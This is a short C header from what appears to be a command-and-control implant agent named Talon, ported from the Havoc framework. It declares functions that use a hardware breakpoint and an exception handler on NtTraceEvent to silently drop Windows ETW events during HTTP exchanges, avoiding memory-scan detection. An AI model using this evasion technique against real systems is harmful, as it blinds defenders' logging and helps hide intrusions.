#ifndef AGENT_ETW_H
#define AGENT_ETW_H

#include <Talon.h>

/* ETW interception via hardware breakpoint — ported from Demon (Havoc)
 * HwBpEngine, simplified for Talon's single-threaded design. A local
 * execution breakpoint (Dr0) is set on ntdll!NtTraceEvent; a first-in-line
 * VEH consumes the resulting single-step exception and redirects RIP to the
 * caller's return address, so every ETW event write during the armed window
 * is silently dropped. The function bytes are never patched (invisible to
 * memory scans) and the Dr registers are only set for the duration of an
 * HTTP exchange. */

/* Resolve NtTraceEvent + register the VEH (call once at startup). */
VOID EtwInit( VOID );

/* Set/clear the Dr0 execution breakpoint on the current thread. */
BOOL EtwBpArm( VOID );
VOID EtwBpDisarm( VOID );

#endif
